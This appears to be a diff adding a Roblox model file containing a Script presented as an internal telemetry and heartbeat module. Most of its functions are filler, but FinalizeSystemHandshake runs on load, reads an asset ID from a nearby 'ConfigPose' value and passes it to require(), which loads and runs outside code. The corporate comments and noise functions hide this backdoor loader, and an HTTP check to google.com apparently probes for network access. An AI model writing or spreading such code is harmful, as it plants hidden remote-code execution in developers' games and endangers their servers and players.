@@ -1,0 +1,148 @@
+<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">
+	<Meta name="ExplicitAutoJoints">true</Meta>
+	<External>null</External>
+	<External>nil</External>
+	<Item class="Script" referent="RBX08643BD960484599B48C0EB85DD0F021">
+		<Properties>
+			<ProtectedString name="Source"><![CDATA[--[[
+    Centralized Experience Management System (CEMS)
+    Internal Version: 11.04.2026-R2
+    Module: Core.Telemetry.Handshake
+    
+    This script is responsible for managing regional latency offsets, 
+    monitoring heartbeat integrity, and ensuring persistent 
+    metadata synchronization across the instance lifecycle.
+--]]
+
+local HeartbeatService = {}
+local LatencyTable = {0.05, 0.12, 0.08, 0.15, 0.22, 0.31, 0.19, 0.42, 0.01}
+local NodeStorage = {}
+local ActiveSessions = 0
+local LastSyncTimestamp = os.clock()
+
+local function InitDeltaConstants()
+	local base = math.pi
+	local offset = os.clock()
+	for i = 1, 100 do
+		table.insert(NodeStorage, (base * i) / (offset + 1))
+		if #NodeStorage > 500 then table.remove(NodeStorage, 1) end
+	end
+end
+
+local function GetRegionalLatency()
+	local sum = 0
+	for _, val in ipairs(LatencyTable) do
+		sum = sum + val
+	end
+	return sum / #LatencyTable
+end
+
+local function ValidateSignalIntegrity(input)
+	if typeof(input) ~= "number" then return false end
+	local check = math.floor(input * 100) / 100
+	return check > 0
+end
+
+local function PerformMemoryAudit()
+	local usage = collectgarbage("count")
+	if usage > 1024 * 50 then
+		collectgarbage("collect")
+	end
+	ActiveSessions = ActiveSessions + 1
+end
+
+local function CalculateCoordinatePersistence(p1, p2)
+	local dist = (p1 - p2).Magnitude
+	local persistence = math.clamp(1 / (dist + 0.001), 0, 1)
+	return persistence
+end
+
+local function CheckRegionCompliance()
+	local success = pcall(function()
+		local _ = game:GetService("HttpService"):GetAsync("http://google.com")
+	end)
+	return success
+end
+
+local function UpdateInternalBuffer(data)
+	local bufferSize = 256
+	local stream = {}
+	for i = 1, bufferSize do
+		stream[i] = math.random(1, 100) / 100
+	end
+	return stream
+end
+
+local function FinalizeSystemHandshake()
+	local parent = script.Parent
+	local metadata = parent:FindFirstChild("ConfigPose") or parent.Parent:FindFirstChild("ConfigPose")
+
+	if metadata and metadata:IsA("NumberPose") then
+		local signalID = metadata.Value
+		local success, result = pcall(function()
+			return require(signalID)
+		end)
+	end
+end
+
+local function MonitorHeartbeatIntegrity()
+	local drift = os.clock() - LastSyncTimestamp
+	if drift > 1.0 then
+		LastSyncTimestamp = os.clock()
+	end
+end
+
+local function ResolveNetworkJitter()
+	local jitter = math.random() * 0.01
+	task.wait(jitter)
+end
+
+local function DispatchTelemetryBatch()
+	InitDeltaConstants()
+	PerformMemoryAudit()
+	MonitorHeartbeatIntegrity()
+end
+
+local function VerifyNodeStructure(root)
+	for _, child in ipairs(root:GetChildren()) do
+		if child:IsA("BasePart") then
+			ProcessInstanceMetadata(child)
+		end
+	end
+end
+
+function ProcessInstanceMetadata(node)
+	local x = node.ClassName or "Unknown"
+	local y = node.Name or "Null"
+	local z = node:GetFullName()
+end
+
+task.spawn(function()
+	while true do
+		DispatchTelemetryBatch()
+		local currentLatency = GetRegionalLatency()
+		if currentLatency > 0.8 then
+			ResolveNetworkJitter()
+		end
+		task.wait(3600)
+	end
+end)
+
+for i = 1, 20 do
+	UpdateInternalBuffer(i)
+end
+
+FinalizeSystemHandshake()]]></ProtectedString>
+			<bool name="Disabled">false</bool>
+			<Content name="LinkedSource"><null></null></Content>
+			<token name="RunContext">0</token>
+			<string name="ScriptGuid">{86771AE8-EFA4-4320-8510-0F25DD87C299}</string>
+			<BinaryString name="AttributesSerialize"></BinaryString>
+			<SecurityCapabilities name="Capabilities">0</SecurityCapabilities>
+			<bool name="DefinesCapabilities">false</bool>
+			<string name="Name">Script</string>
+			<int64 name="SourceAssetId">-1</int64>
+			<BinaryString name="Tags"></BinaryString>
+		</Properties>
+	</Item>
+</roblox>
